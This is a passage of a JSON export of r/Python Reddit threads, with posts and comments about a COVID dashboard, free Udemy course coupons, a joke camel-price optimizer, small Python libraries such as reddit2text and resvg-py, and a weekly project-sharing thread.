            "content": "Generating easy to remember passwords is not best practices. Use a password manager."
        },
        {
            "author": "CaptainFoyle",
            "score": "5",
            "content": "Usually, if a password is short and strong, it's not memorable. If it's strong and memorable, it's not short (and probably not safe). And if it's memorable and short, it's usually not safe."
        }
    ]
},
{
    "post_author": "mrgadgety",
    "post_id": "g5ymoy",
    "post_score": "1725",
    "post_time": "Wednesday, April 22, 2020 at 1:21:30 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Six months into Python and Data science, my first Dashboard Web App with covid19 data using python only",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "mrgadgety",
            "score": "93",
            "content": "Six months into Python and Data science, my first Dashboard Web App with covid19 data using python only Hi all, I have started my data science with python journey for almost 6 months now, and most of the learning is done through jupyter notebook and console until I came across Plotly Dash. I am super excited about this tool, as it allows me to build web app and deploy to server without any knowledge of html, css and so on. (So far, I only know python and a little bit of java) I decided to build this Covid 19 dashboard as I am interested in global development and I wish to customized the dashboard to highlight data I am interested in. I have included the source code, as I am quite new to Plotly and Dash and I might not be following best practices, I hope to receive feedback on how I can improve in terms of anything and hope to learn from everyone. Lastly, I wish all of you, stay healthy and stay safe. Covid 19 Dashboard Version 2 using Plotly Dash (Similar to version 1 with cosmetic improvement) https://covid19dashboardsg.herokuapp.com/ Covid 19 Dashboard Version 1 with Source code on Github https://covid19-dashboard-online.herokuapp.com/ Source code for version 1 https://github.com/Unicorndy/covid19_dashboard"
        },
        {
            "author": "kiku_here",
            "score": "13",
            "content": "Good job mate... Are you self learning ?"
        },
        {
            "author": "-fmvs-",
            "score": "7",
            "content": "Very nice dude. Kudos 👏👌"
        },
        {
            "author": "theAllSeeingBeaver",
            "score": "5",
            "content": "Very slick.. Great work!"
        },
        {
            "author": "loulouoz",
            "score": "5",
            "content": "Nice, well done. I have used dash to made a dashboard also. I love it. I need to use more bootstrap though: http://virus-corona.herokuapp.com/"
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "Would you mind telling me what courses or what book you did? I have learned Python for a few weeks now and would like to know what you did"
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "daamn that look so god damn sexy GJ"
        },
        {
            "author": "garlic_bread_thief",
            "score": "4",
            "content": "How much did you pay for the domain?"
        }
    ]
},
{
    "post_author": "JO3POTATO",
    "post_id": "kouixi",
    "post_score": "1812",
    "post_time": "Saturday, January 2, 2021 at 12:16:35 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Learn Python in 2021 with these FREE Udemy Courses!",
    "media": [
        "https://www.udemy.com/course/python3-for-beginners/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/google-chrome-extension/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/ethical-hacking-python/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/ethical-hacking-kali-linux/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/linux-system-admin/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/python-complete/?couponCode=EE03C893BA5B7A8127D1",
        "https://www.udemy.com/course/ethical-hacking-professional/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/front-end-web-development/?couponCode=HAPPYNEWYEAR",
        "https://www.udemy.com/course/full-stack-javascript/?couponCode=HAPPYNEWYEAR"
    ],
    "post_content": "Learn Python, ethical hacking, web development and more with these 9 FREE Udemy courses! Happy new years! 😀\nhttps://www.udemy.com/course/ethical-hacking-kali-linux/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/ethical-hacking-python/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/python-complete/?couponCode=EE03C893BA5B7A8127D1\nhttps://www.udemy.com/course/front-end-web-development/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/full-stack-javascript/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/linux-system-admin/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/python3-for-beginners/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/google-chrome-extension/?couponCode=HAPPYNEWYEAR\nhttps://www.udemy.com/course/ethical-hacking-professional/?couponCode=HAPPYNEWYEAR",
    "comments": [
        {
            "author": "cva_thapa",
            "score": "214",
            "content": "0:00 0:01 0:01",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "105",
                    "content": "wait idk u can reply with images",
                    "replies": [
                        {
                            "author": "cusini",
                            "score": "60",
                            "content": "0:00 0:00 0:02",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "16",
                                    "content": "0:00 0:00 0:05"
                                },
                                {
                                    "author": "yearningcraving",
                                    "score": "18",
                                    "content": "0:00 0:00 0:00"
                                }
                            ]
                        },
                        {
                            "author": "6rubtub9",
                            "score": "20",
                            "content": "",
                            "replies": [
                                {
                                    "author": "CharizardUsedCut",
                                    "score": "5",
                                    "content": ""
                                },
                                {
                                    "author": "samrana12",
                                    "score": "4",
                                    "content": "0:00 0:00 0:00"
                                }
                            ]
                        },
                        {
                            "author": "anna_lynn_fection",
                            "score": "16",
                            "content": "Reddit's transformation to facebook is almost complete!",
                            "replies": [
                                {
                                    "author": "omoroka",
                                    "score": "4",
                                    "content": "Release the buddypokes!"
                                }
                            ]
                        },
                        {
                            "author": "cva_thapa",
                            "score": "13",
                            "content": "Haha yeah, I just figured it out some minutes earlier. Edit: Turns out only some subreddits with power-up offer this atm"
                        },
                        {
                            "author": "muhrizqiardi",
                            "score": "3",
                            "content": "oot but this reminds me of back when i used 9gag... surprised reddit didn't have this until recently"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Gabernasher",
            "score": "29",
            "content": "Where's automate? Goes free every month.",
            "replies": [
                {
                    "author": "dbhol",
                    "score": "18",
                    "content": "Usually the course creator puts out a notification when his course is free. It was free quite recently so might not be until later in the month that is goes again. Just keep an eye out on this sub or other similar python related ones for u/AlSweigart"
                }
            ]
        },
        {
            "author": "scruffykid",
            "score": "19",
            "content": "Any of these python courses good for people who know how to code already? Coming over from a different language"
        }
    ]
},
{
    "post_author": "Ofirk",
    "post_id": "fctk6e",
    "post_score": "1722",
    "post_time": "Tuesday, March 3, 2020 at 3:01:23 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made this script to find the optimal person to be traded for camels",
    "media": [
        "https://i.redd.it/9lyg7ef56gk41.png",
        "https://preview.redd.it/9lyg7ef56gk41.png?width=640&crop=smart&auto=webp&s=a4d30562ff1e437f7940c4e89099de3ec60b9fde"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Ofirk",
            "score": "229",
            "content": "If you're in the camels market, you've probably heard of this site, which allows you to find your boyfriend/girlfriend's worth in camel units. As I wanted to find the ultimate person (that produces the highest number of camels) in the lowest number of requests to the server possible, I turned to the Bayesian Optimization algorithm using hyperopt (rather than a grid search or random search). As the site's camel-calculation function is unknown, this is a black-box optimization problem. After maximizing the score for 5000 iterations, I got the following result (106 camels) for this input: age: 26 beard: middle body: muscle eyecolor: blue hair: middle haircolor: blonde height: 178 Link to GitHub: https://github.com/OfirKP/CamelsOptimizer"
        },
        {
            "author": "FrostyTie",
            "score": "98",
            "content": "So apparently I’m worth 7 camels more than my ex girlfriend. Good to know I got out of that relationship"
        },
        {
            "author": "[deleted]",
            "score": "29",
            "content": "Only 34 camels, bah."
        },
        {
            "author": "maesterarz",
            "score": "20",
            "content": "68, so close damn"
        },
        {
            "author": "thedjotaku",
            "score": "10",
            "content": "Is this some kind of meme thing?"
        },
        {
            "author": "LifeIsBio",
            "score": "8",
            "content": "True story: my wife and I visited Egypt a couple years ago and a random merchant at the market offered me 200 camels for my wife. Pretty solid offer."
        },
        {
            "author": "LocalRaspberry",
            "score": "15",
            "content": "TIL I learned my bf and I are worth the same amount of camels. As all things should be."
        },
        {
            "author": "r_n_a_1",
            "score": "10",
            "content": "I tried my luck with female standards and got to 110: Results =================== Score: 110 camels age: 18 breast size: 3 figure: sporty eyecolor: blue hair lenght:  long haircolor: blond height: 172"
        },
        {
            "author": "sly-otter",
            "score": "5",
            "content": "So my fiancé owes me 7 camels then? How will our backyard accommodate this? Is there a camel to dog or horse conversion?"
        },
        {
            "author": "VictorD02",
            "score": "4",
            "content": "Finally, now I can trade my brother!"
        }
    ]
},
{
    "post_author": "NFeruch",
    "post_id": "1bxmsxd",
    "post_score": "142",
    "post_time": "Sunday, April 7, 2024 at 12:29:34 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made my very first python library! It converts reddit posts to text format for feeding to LLM's!",
    "media": [
        "https://pastebin.com/mmHFJtcc",
        "https://github.com/NFeruch/reddit2text"
    ],
    "post_content": "Hello everyone, I've been programming for about 4 years now and this is my first ever library that I created!\nWhat My Project Does\nIt's called Reddit2Text, and it converts a reddit post (and all its comments) into a single, clean, easy to copy/paste string.\nI often like to ask ChatGPT about reddit posts, but copying all the relevant information among a large amount of comments is difficult/impossible. I searched for a tool or library that would help me do this and was astonished to find no such thing! I took it into my own hands and decided to make it myself.\nTarget Audience\nThis project is useable in its current state, and always looking for more feedback/features from the community!\nComparison\nThere are no other similar alternatives AFAIK\nHere is the GitHub repo: https://github.com/NFeruch/reddit2text\nIt's also available to download through pip/pypi :D\nSome basic features:\nGathers the authors, upvotes, and text for the OP and every single comment\nSpecify the max depth for how many comments you want\nChange the delimiter for the comment nesting\nHere is an example truncated output: https://pastebin.com/mmHFJtccUnder the hood, I relied heavily on the PRAW library (python reddit api wrapper) to do the actual interfacing with the Reddit API. I took it a step further though, by combining all these moving parts and raw outputs into something that's easily useable and very simple.Could you see yourself using something like this?",
    "comments": [
        {
            "author": "Hey_Look_80085",
            "score": "56",
            "content": "Flight the valkyrie plays. Google lawyers descend from the thundering heavens."
        },
        {
            "author": "Timo_schroe",
            "score": "18",
            "content": "Whats the difference to just use praw ?",
            "replies": [
                {
                    "author": "Terrible_Student9395",
                    "score": "5",
                    "content": "Literally nothing"
                },
                {
                    "author": "NFeruch",
                    "score": "1",
                    "content": "It actually uses PRAW under the hood, but I just made it simpler + easier to interface with if you just want the text format of a Reddit post. I’m going to add more things like saving the output as a json, csv, etc, and anonymizing usernames that isn’t strictly a part of the PRAW library, which I think will make it’s value even more apparent!",
                    "replies": [
                        {
                            "author": "Timo_schroe",
                            "score": "0",
                            "content": "I appreciate your work. But to be honest, I would have to work with another Layer which has no advantage over using praw. I have to get comfortable with another Import and I have no Control over this and maybe need to Debug and Change to get the data as I like - I See no advantage Its just use praw -> and Output, thats a 5 Minute task"
                        }
                    ]
                }
            ]
        },
        {
            "author": "TechieJi",
            "score": "23",
            "content": "why do you want to resurrect skynet is beyond me",
            "replies": [
                {
                    "author": "ClownMorty",
                    "score": "6",
                    "content": "Although, feeding skynet all of Reddit might give humanity a fighting chance."
                }
            ]
        },
        {
            "author": "Thunder_Squatch",
            "score": "8",
            "content": "This is really cool. Just curious, what/why are you asking chatGPT about Reddit posts?",
            "replies": [
                {
                    "author": "SlickinNTrickin",
                    "score": "5",
                    "content": "You better off not asking/knowing."
                }
            ]
        },
        {
            "author": "RevolutionaryRain941",
            "score": "4",
            "content": "Data formatting will become a necessity in the coming days. as there will be a need for more and more data for the machine learning models."
        },
        {
            "author": "floznstn",
            "score": "7",
            "content": "do you want skynet? because that's how you get skynet /s all jokes aside, great work!"
        },
        {
            "author": "blue-lighty",
            "score": "3",
            "content": "This is awesome. I came across this exact use case in one of my projects, and built a quick and dirty version of this to grab a post using PRAW and convert it to text and feed to an LLM. Can’t wait to give this a shot"
        },
        {
            "author": "binlargin",
            "score": "2",
            "content": "Nice! Could do with jsonp threaded output for use in training."
        },
        {
            "author": "MixtureOfAmateurs",
            "score": "2",
            "content": "WAWAOOOHH cool :) Does chatGPT understand that format well? It looks super clean to me but I'm a human sadly so idk. Also is this reddit app shenanigans free? Did they being the free api back as an app and no on noticed or is it tied to an credit card?",
            "replies": [
                {
                    "author": "NFeruch",
                    "score": "2",
                    "content": "I need to see the exact numbers, but the Reddit API is still free for non-commercial use and with a lower rate limit than before. For most people’s purposes, it still is free!"
                }
            ]
        },
        {
            "author": "ironman_gujju",
            "score": "2",
            "content": "W bro I'm looking for this type of libraries"
        },
        {
            "author": "ironman_gujju",
            "score": "2",
            "content": "Try to add sentence transformers as well."
        },
        {
            "author": "mexicanameric4n",
            "score": "2",
            "content": "Very nice, I like that you’ve got it structured, one  way I grab data is  to just add .json on the end of a post or subreddit. see below: https://www.reddit.com/r/Python/comments/1bxmsxd/i_made_my_very_first_python_library_it_converts.json"
        },
        {
            "author": "ace_hawk5",
            "score": "2",
            "content": "Cool idea looking forward to trying it out"
        },
        {
            "author": "Tall_Candidate_8088",
            "score": "2",
            "content": "i believe"
        }
    ]
},
{
    "post_author": "Neustradamus",
    "post_id": "1c0kd2z",
    "post_score": "8",
    "post_time": "Wednesday, April 10, 2024 at 3:28:06 PM GMT+3",
    "flair_text": "News",
    "post_title": "Python 3.12.3 - The third maintenance release of Python 3.12",
    "media": [
        "https://www.python.org/downloads/release/python-3123/"
    ],
    "post_content": "https://www.python.org/downloads/release/python-3123/",
    "comments": [
        {
            "author": "dariofg",
            "score": "1",
            "content": "Is it worthy to upgrade from 3.11.4?",
            "replies": [
                {
                    "author": "Traditional-Wheel-68",
                    "score": "2",
                    "content": "I don’t think tensor flow works on 3.11.4 i think you should wait"
                },
                {
                    "author": "assumptionkrebs1990",
                    "score": "2",
                    "content": "Unless you need the better f-strings 3.12 introduces now, I think you can wait. My plain is to update once 3.12.9 comes out and skipping 3.13 entireiy."
                }
            ]
        }
    ]
},
{
    "post_author": "BasePlate_Admin",
    "post_id": "1c2tudb",
    "post_score": "7",
    "post_time": "Saturday, April 13, 2024 at 7:54:35 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "resvg-py, safe bindings for resvg project",
    "media": [
        "https://github.com/baseplate-admin/resvg-py",
        "https://resvg-py.readthedocs.io/en/latest/index.html",
        "https://github.com/baseplate-admin/coreproject",
        "https://www.npmjs.com/package/@vercel/og"
    ],
    "post_content": "Hi everyone,\nGithub\nDocumentation\nWhat my project does :\nFor a long time, i had a problem of rendering svg to png format. Specially after my project required opengraph image generation. Vercel's OG supports this functionality but that's JavaScript.\nSo therefore i created this bindings to resvg library (same library used by vercel og)\nTarger Audience\nDevelopers\nUsage\nInstall it like this:\npip install resvg_py\nThen use it like this:\nimport resvg_py\n\nsvg_string = \"\"\"\n    <svg width=\"300\" height=\"130\" xmlns=\"http://www.w3.org/2000/svg\">\n      <rect width=\"200\" height=\"100\" x=\"10\" y=\"10\" rx=\"20\" ry=\"20\" fill=\"blue\" />\n    </svg>\n\"\"\"\n\nprint(resvg_py.svg_to_base64(svg_string))\nGoals:\nTo enable all the features available in resvg but don’t write to the disk, everything must be done in memory.\nUse the bare minimum amount of packages, in both python side and rust side\nMake the package as user friendly as possible\nComparison\nI don't think theres any project that has safe bindings for resvg\nPlease do note that this is my first time writing a package in rust.",
    "comments": [
        {
            "author": "keidainc",
            "score": "1",
            "content": "This is cool! You mention using this for \"opengraph image generation\". However, if I remember correctly og:image requires a url to the image whereas this package returns the image as bytes. How do you overcome this?",
            "replies": [
                {
                    "author": "BasePlate_Admin",
                    "score": "1",
                    "content": "Hi thanks for your interest in this. However, if I remember correctly og:image requires a url to the image whereas this package returns the image as bytes. You use this package in combination with a web-framework like django/flask/fastapi/litestar and serve the BytesIO object with appropriate headers.",
                    "replies": [
                        {
                            "author": "keidainc",
                            "score": "1",
                            "content": "Makes sense, thanks!",
                            "replies": [
                                {
                                    "author": "BasePlate_Admin",
                                    "score": "1",
                                    "content": "Let me know if you want a section in the documentation where it explain how to use it with web frameworks"
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "SpeakerOk1974",
    "post_id": "1bye1tw",
    "post_score": "1",
    "post_time": "Sunday, April 7, 2024 at 11:12:28 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Would there be general interest for a library that ensure external application API call safety? ",
    "media": [],
    "post_content": "Python has become a popular inclusion as a scripting language for many professional software packages. However, the APIs presented by these applications may be unsafe and/or do not include pythonic error handling. As someone working in the energy sector at my day job, I often find myself wrestling issues external to my python code in our power system simulator (usually memory related) that due to the implementation of the API can error at runtime below the exception handling mechanism of the interpreter. I will have have to implement a library for this purpose either internally or as an open-source side project.\nTraditionally, we handle these errors by isolating all potentially unsafe API calls in their own function and running that function in a separate process with multiprocessing and a handler function orchestrating the process and handling the exit codes. Although effective, this basic solution doesn't have the level of functionality needed (no logging, no stdout/stderr redirection, no exceptions, etc) and brings a decent amount of boilerplate to simple scripts.\nI wanted to post here and see if this is an issue others in the community face interacting with external code written in lower level languages they cannot freely modify. This isn't a detailed proposal more so trying to generate discussion around the idea, but essentially the module would provide decorators to wrap the external calls safely, with extra features like logging, custom exception classes and more to allow pythonic handling of errors.\nTLDR: Would there be interest in a library centered around pain-free handling of runtime errors that happen below the exception handling mechanism with extra convenience features?",
    "comments": [
        {
            "author": "yvrelna",
            "score": "8",
            "content": "Maybe, but I don't think there is much here that can be done as a generic library. Traditionally, it's the wrapper libraries' job to wrap any underlying error into Python errors, and/or provide any validations needed to prevent unhandled error. below the exception handling mechanism of the interpreter Errors like those generally should be handled by either fixing the original library and/or validating the call arguments before being passed into the ffi call. In my experience, it's generally quite rare that calling a library would just crash an application nilly willy, it can happen but it's rare enough that it's rarely at the front of my mind. Usually, the overhead of wrapping the library into a subprocess is not worth the additional safety. If you need to process untrusted input, then yeah, I can see why this can occasionally be useful for some niche. Generally, once that kind of concerns becomes relevant, it likely also make sense to turn this into a microservice.",
            "replies": [
                {
                    "author": "SpeakerOk1974",
                    "score": "0",
                    "content": "Yeah making it generic enough to be useful for more than one specific application is the most difficult part. I see it as more of a framework that makes it easier to handle the runtime errors, by providing fairly generic classes that can be inherited from for more specific use cases and drive down the amount of boilerplate required. It would be impossible to make a complete batteries-included solution for the general use case. I do see your point about it being a rare in general occurrence. Usually you should just go and fix the offending external code, but that isn't always possible like in my specific use case. I also wouldn't advise people to use something like this as a crutch instead of proper input sanitation before calling the API and proper testing. The use case I am envisioning is in cases where you have long running process that can be disrupted by a segmentation fault for example and you have checked all the boxes and still run in to reliability issues from time to time due to underlying bugs in the software you are interacting with and provide robust and easy to use logging functionality for runtime errors. This also makes it possible to send logs to the software vendor to fix the issue, rather than a hack solution to sidestep it that also makes it hard to reproduce. I appreciate your feedback alot, and this is exactly the kind of discussion I was hoping for!"
                }
            ]
        },
        {
            "author": "alexkiro",
            "score": "1",
            "content": "I have had this issue in the past at some point. If I remember correctly I was running into random segmentation faults while processing images with Pillow. Ended up doing what I needed in a separate subprocess, to ensure the parent process doesn't die as well. I haven't had the need for anything similar in the past 10 years. So I would say there would be at least a small niche interest for it. Sounds like a good idea for a small open source project. Best of luck with it!",
            "replies": [
                {
                    "author": "SpeakerOk1974",
                    "score": "0",
                    "content": "Thanks for the support! And thats exactly the kind of use case I was thinking this kind of construct could prove useful for, so glad to hear that it could help solve problems for others which is exactly why I want to make it something the whole community can benefit from. Even with proper input sanitation and use of the API, the threat of not being able to handle a run time error and your long running process getting killed is very inconvenient and hard to work around/debug.",
                    "replies": [
                        {
                            "author": "turtle4499",
                            "score": "3",
                            "content": "I had it crop up with palm reading software and it was one of the worst things I have ever debugged. It was pretty awful in that the bug didn't show up in either our docker images or our hardware test system. The actual bug was related a borked UDP code that would try to lookup previous frames that where no longer in memory and only occured in mid range packet loss wifi. (I had to wrap my router in tinfoil to simulate it). If it had high loss rate it failed properly to the handler but mid range it would try to lookup the previous data slices that were out of memory by that point. The first time it had cropped up was during a presentation, it worked flawlessly on cellphones where it used TCP. I had not anticipated for the external dev using UDP in the embedded binaries and TCP in the iOS binaries. It was impossible work around and debug. My biggest concern would actually just be making whatever you build generalizable enough to work. I had to rebuild the entire wrapping code to it and launch it from a subprocess to even corner the problem enough to deal with it. While the usage of this is niche, it is straight up a fucking nightmare currently.",
                            "replies": [
                                {
                                    "author": "LongjumpingGrape6067",
                                    "score": "1",
                                    "content": "Nice trick with the tinfoil :)"
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "nommu_narwhal",
    "post_id": "ac3oj4",
    "post_score": "1812",
    "post_time": "Thursday, January 3, 2019 at 11:17:46 AM GMT+3",
    "flair_text": "",
    "post_title": "Python in one?",
    "media": [
        "https://imgur.com/cKEwZ1v",
        "https://external-preview.redd.it/_BRpHjoGF1XXcK9BaU41xIzW_l6_mukcFZ-sBQuY4jI.jpg?auto=webp&s=af7c7f4705194c8a8e90798bc0a441c36584baa5"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Rob_Haggis",
            "score": "214",
            "content": "Relevant XKCD",
            "replies": [
                {
                    "author": "import_antigravity",
                    "score": "80",
                    "content": "It's my absolute favourite xkcd!",
                    "replies": [
                        {
                            "author": "Rob_Haggis",
                            "score": "46",
                            "content": "Username checks out"
                        }
                    ]
                },
                {
                    "author": "unkz",
                    "score": "33",
                    "content": "SyntaxError: Missing parentheses in call to 'print'",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "3",
                            "content": "You didn't need parenthesis in python 2."
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "14",
                    "content": "Oh, that punchline is golden.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "4",
                            "content": "I don’t get it :/"
                        }
                    ]
                },
                {
                    "author": "OnlineGrab",
                    "score": "3",
                    "content": "That's an easter egg in Python now. Try to importing the module antigravity."
                },
                {
                    "author": "energybased",
                    "score": "6",
                    "content": "I wish he would update that for Python 3."
                },
                {
                    "author": "NowMoreFizzy",
                    "score": "1",
                    "content": "no one gets dynamic typing and I wouldn't be in python if it didn't exist"
                }
            ]
        },
        {
            "author": "ace6807",
            "score": "74",
            "content": "At a Python REPL: import antigravity"
        },
        {
            "author": "[deleted]",
            "score": "14",
            "content": "something_complicated.do()"
        },
        {
            "author": "K1NG-N3RD",
            "score": "28",
            "content": "This is how 90% of my programming conversations go and it never makes me mad!"
        },
        {
            "author": "ddollarsign",
            "score": "3",
            "content": "ModuleNotFoundError: No module named 'something' :P"
        },
        {
            "author": "coffeewithalex",
            "score": "1",
            "content": "Please don't turn python into the next NodeJS."
        },
        {
            "author": "AN3223",
            "score": "-2",
            "content": "The non-question got a non-answer, that's justice."
        }
    ]
},
{
    "post_author": "serjester4",
    "post_id": "1bt7ik3",
    "post_score": "4",
    "post_time": "Monday, April 1, 2024 at 7:00:15 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Better PDF Layout Detection for LLM's + table support",
    "media": [
        "https://github.com/Filimoa/open-parse/"
    ],
    "post_content": "What's the first step to building 90% of AI applications?\nChunking your documents! Unfortunately there's very few libraries for this and most rely on naively splitting text into N characters. You lose so much valuable information hidden in the layout of the document when you do this. If you give an LLM bad inputs, you're going to get bad results.\nhttps://github.com/Filimoa/open-parse/\nWhat it does:\nThe library can detect the layout of a PDF, convert to markdown and extract tables into html in one line of code. You can then feed this directly into your vector database or something like LlamaIndex. It does all this while preserving bounding boxes so you can display citations directly to the user.\nTarget Audience:\nAnyone building a RAG AI app. I run a talk-to-your-file website that's seen millions of documents and this library represents a giant chunk of what I know about feeding documents to LLM's.\nComparison:\nOpen source libraries like LlamaIndex chunk your documents into strings of fixed length. There's a couple commercial solutions that do this but they're expensive (typically 100 pages / dollar) and honestly have less than ideal results (AWS Texttract, Adobe, Google).\nFacebook has nougat for converting files to markdown but it's incredibly slow on anything without a massive GPU.",
    "comments": [
        {
            "author": "LittleMlem",
            "score": "1",
            "content": "The PDF parsing ability is just tesseract, right?",
            "replies": [
                {
                    "author": "serjester4",
                    "score": "3",
                    "content": "The pdf-to-text aspect of the library is done optionally with either pdfminer (no OCR, faster) or pymupdf (tesseract OCR but a restrictive license). The majority of PDF's these days are in a non-image format, so the OCR is mostly just a last resort.",
                    "replies": [
                        {
                            "author": "LittleMlem",
                            "score": "3",
                            "content": "You be surprised just how many pdfs are an absolute nightmare to read as a file as opposed to just OCRing it",
                            "replies": [
                                {
                                    "author": "CodingButStillAlive",
                                    "score": "1",
                                    "content": "I absolutely agree with you."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bxq7tt",
    "post_score": "6",
    "post_time": "Sunday, April 7, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "hyperlitemedia",
            "score": "2",
            "content": "Video Directors Monitor: Nearing initial release of a video monitor that automatically initializes all connected cameras, allows user to choose which camera is displayed in the main window, ability to grab live frames from the feed, toggle focus peaking on and off, choose between red, blue or green focus peaking colors, increase or decrease focus peaking threshold, toggle RGB histograms, toggle luminance histogram, and toggle rule of thirds grid. More functions in the works after initial release."
        },
        {
            "author": "RRTheGuy",
            "score": "2",
            "content": "My Current projects ml: stuff where i learn machine learning from a book pymaths: where i learn python and mathematicals from a book qt-learn: i learn qt from a book motsmeles: word search generator / Un générateur de mots-mêlés My past projects pygame_snake: a snake game using pygame library angry_birds: angry birds game using pygame library drawing: a project for drawing. That uses pygame dcdljeu: solveur de mots le plus long et compte est bon My past projects In scratch chess: a chess game flappy parrot: a game like flappy bird snake: the game where there is a snake that have to eat to grow mots-mêlés 1 mots-mêlés 2 chifoumi en ligne: un chifoumi en ligne contre un bot ou un vrai joueur My future projects A C++ project A ML project a js project (a swift app) pygame: flappy bird pygame: tetris pygame: platformer pygame: chess For a more detailed, see myprojects.md"
        },
        {
            "author": "weitaoyap",
            "score": "1",
            "content": "Current working on it... is a collection of an applications (just a hobby and test my programming skill) https://github.com/weitaoyap111/pyexpansion"
        },
        {
            "author": "crimefog",
            "score": "1",
            "content": "I made this yesterday and am using it today in PyCharm, etc. Reference charts in pivot tables / slicers. https://github.com/Dan-OSU/Reference-sheets/raw/main/Pivot-table-ized-refs/Reference-sheets.xlsx https://github.com/Dan-OSU/Reference-sheets/"
        },
        {
            "author": "Its_NotTom",
            "score": "1",
            "content": "I just finished a Geoguessr AI that guesses locations around the world from a single image (its already better than me https://youtu.be/coXvaZB0Sx0?si=Glcc0j6p4Ps8Hm1G )"
        },
        {
            "author": "EternityForest",
            "score": "1",
            "content": "A whole bunch of refactoring, and devops. The more time goes by the more I want all my personal projects to be Best Practicesful! I also made a bunch of 88x31 badges for my repos and released them as CC0. I've been adding pre-commit hooks to all my projects, moving all my tests to pytest, Setting up linting and auto fixing with Ruff, adding tests to stuff that previously didn't have any. I took the media handling stuff from my other projects and put it in one library(https://github.com/EternityForest/icemedia/tree/main). It has JACK connection management, a GStreamer wrapper that runs the actual media stuff in a background process transparently, and an audio player that can do crossfading and slowdown effects. I have also given Scullery (https://github.com/EternityForest/scullery), a general purpose utility library that handles an us and worker pool a fresh coat of paint. It now also has decorators for running things every N seconds in background threads, and can do state machines as well Plus, it's got more documentation and unit tests with pytest. On my big long term Kaithem server project, I've gotten rid of an insane amount of features. I've used it for ten years, and seen others use it, so I have a lot better idea of what's really worth keeping around."
        },
        {
            "author": "Particular-Ad-2721",
            "score": "1",
            "content": "i made a simple assistant with wikipedia and wolfram alpha"
        },
        {
            "author": "thereal0ri_",
            "score": "1",
            "content": "I made a discord bot that handles emails and authentication. https://github.com/therealOri/MailerBot Firstly, it uses mailtrap combined with my own website/domain for handling the sending of emails. I tried to use smtp with gmail but it just didn't work for me and I couldn't get it to work, and I don't feel like spending hours troubleshooting and completing a million+ steps just to get it to work. So I opted to make use of the fact that I have my own domain/website and the api of mailtrap (which also wasn't a headache to make an account and get things set up..like most other places.) to send the emails. (if anyone needs help with getting the email sending part to work, let me know) Now, On to what the bot does; If you have a list of emails that belong to people you want to be allowed into the server, you can add them to the bots whitelist and when they try to verify, they would have an email with a code sent to their email. If a user tries to verify using an email that isn't in the bots whitelist, they will be sent an error message and can't continue further. The reason I still send codes to the emails is because say someone has the name of an email for a whitelisted user, they could just submit the email, the bot would see that it's whitelisted and let them in. So Instead, I send a code to the email to verify that the person that submitted the email actually does have access to the email's inbox. So yeah, this is what I've been working on recently and I hope this bot could give someone somewhere some use/help!"
        }
    ]
},
{
    "post_author": "ivaylos",
    "post_id": "nefzy6",
    "post_score": "1797",
    "post_time": "Monday, May 17, 2021 at 4:16:48 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "MIT offers free online course in Computer Programming using Python",
    "media": [
        "https://external-preview.redd.it/-INoiDimMhFpaz_KNkBlh9ZBn9EqlCiLYuu356yWji4.jpg?auto=webp&s=9d2eff0fd33ec3777b9648978ab3ea9b2c82934d",
        "https://www.edx.org/course/introduction-to-computer-science-and-programming-7"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Do you think this playlist contains the full course? I read in the course page that the duration is 9 weeks (14-16 hours effort per week). I don't exactly understand if 'effort' means the combination of course + home work or just course.",
            "replies": [
                {
                    "author": "ivaylos",
                    "score": "18",
                    "content": "Do you think this playlist contains the full course? I read in the course page that the duration is 9 weeks (14-16 hours effort per week). I don't exactly understand if 'effort' means the combination of course + home work or just course.",
                    "replies": [
                        {
                            "author": "Gemini421",
                            "score": "16",
                            "content": "I believe they incorporate the expected time for course completion (including assignments and testing.) If you are auditing the course for informational purposes only, then many of these online classes are closer to 2 to 5, one hour lectures per week ..."
                        },
                        {
                            "author": "xatrekak",
                            "score": "6",
                            "content": "https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-0001-introduction-to-computer-science-and-programming-in-python-fall-2016/"
                        }
                    ]
                }
            ]
        },
        {
            "author": "atreyuroc",
            "score": "150",
